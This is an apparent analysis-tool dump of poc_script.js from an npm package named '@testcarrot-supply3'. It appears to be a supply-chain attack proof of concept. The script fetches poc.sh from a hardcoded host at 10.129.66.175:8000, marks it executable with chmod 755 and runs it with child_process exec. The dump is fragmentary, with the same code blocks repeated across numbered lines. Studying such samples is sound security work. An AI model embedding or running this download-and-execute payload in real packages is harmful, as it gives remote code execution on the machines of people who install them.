// File: tmp/tmp7r7pjr7d/@testcarrot-supply3/package/poc_script.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const http = require('http')
Line 3: _tmp_0 = require('child_process')
Line 7: const scriptUrl = 'http://10.129.66.175:8000/poc.sh'
Line 12: (_tmp_1 = http.get(scriptUrl, (response) => {
  response.pipe(file);

  file.on('finish', () => {
    file.close();
    console.log('[+] POC Action: Payload script downloaded successfully.');

    try {
      // 2. 스크립트에 실행 권한 부여 (Permission Escalation)
      // UNIX 계열 시스템(Linux, macOS)에서 필수적인 단계
      fs.chmodSync(downloadedScriptPath, '755');
      console.log('[+] POC Action: Made the downloaded script executable.');

      // 3. 다운로드한 스크립트 실행 (Execution)
      console.log('[+] POC Action: Executing the downloaded payload...');
      exec(`sh ./${downloadedScriptPath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`[-] POC Error: Failed to execute script. Error: ${error.message}`);
          return;
        }
        // poc.sh 에서 출력한 메시지를 보여줌
        console.log(`[+] POC Success: Script output:\n${stdout}`);
        if (stderr) {
          console.error(`[!] POC stderr: ${stderr}`);
        }
      });
    } catch (err) {
      conso...)
Line 13: response.pipe(file)
Line 15: {
    file.close();
    console.log('[+] POC Action: Payload script downloaded successfully.');

    try {
      // 2. 스크립트에 실행 권한 부여 (Permission Escalation)
      // UNIX 계열 시스템(Linux, macOS)에서 필수적인 단계
      fs.chmodSync(downloadedScriptPath, '755');
      console.log('[+] POC Action: Made the downloaded script executable.');

      // 3. 다운로드한 스크립트 실행 (Execution)
      console.log('[+] POC Action: Executing the downloaded payload...');
      exec(`sh ./${downloadedScriptPath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`[-] POC Error: Failed to execute script. Error: ${error.message}`);
          return;
        }
        // poc.sh 에서 출력한 메시지를 보여줌
        console.log(`[+] POC Success: Script output:\n${stdout}`);
        if (stderr) {
          console.error(`[!] POC stderr: ${stderr}`);
        }
      });
    } catch (err) {
      console.error(`[-] POC Error during chmod/exec: ${err.message}`);
    }
  }
Line 17: console.log('[+] POC Action: Payload script downloaded successfully.')
Line 19: {
      // 2. 스크립트에 실행 권한 부여 (Permission Escalation)
      // UNIX 계열 시스템(Linux, macOS)에서 필수적인 단계
      fs.chmodSync(downloadedScriptPath, '755');
      console.log('[+] POC Action: Made the downloaded script executable.');

      // 3. 다운로드한 스크립트 실행 (Execution)
      console.log('[+] POC Action: Executing the downloaded payload...');
      exec(`sh ./${downloadedScriptPath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`[-] POC Error: Failed to execute script. Error: ${error.message}`);
          return;
        }
        // poc.sh 에서 출력한 메시지를 보여줌
        console.log(`[+] POC Success: Script output:\n${stdout}`);
        if (stderr) {
          console.error(`[!] POC stderr: ${stderr}`);
        }
      });
    }
Line 23: console.log('[+] POC Action: Made the downloaded script executable.')
Line 26: console.log('[+] POC Action: Executing the downloaded payload...')
Line 27: exec(`sh ./${downloadedScriptPath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`[-] POC Error: Failed to execute script. Error: ${error.message}`);
          return;
        }
        // poc.sh 에서 출력한 메시지를 보여줌
        console.log(`[+] POC Success: Script output:\n${stdout}`);
        if (stderr) {
          console.error(`[!] POC stderr: ${stderr}`);
        }
      })
Line 28: {
          console.error(`[-] POC Error: Failed to execute script. Error: ${error.message}`);
          return;
        }
Line 29: console.error(`[-] POC Error: Failed to execute script. Error: ${error.message}`)
Line 33: console.log(`[+] POC Success: Script output:\n${stdout}`)
Line 34: {
          console.error(`[!] POC stderr: ${stderr}`);
        }
Line 35: console.error(`[!] POC stderr: ${stderr}`)
Line 38: catch (err) {
      console.error(`[-] POC Error during chmod/exec: ${err.message}`);
    }
Line 39: console.error(`[-] POC Error during chmod/exec: ${err.message}`)
Line 42: {
  console.error(`[-] POC Error: Failed to download script. Is the local server running? Error: ${err.message}`);
}
Line 43: console.error(`[-] POC Error: Failed to download script. Is the local server running? Error: ${err.message}`)
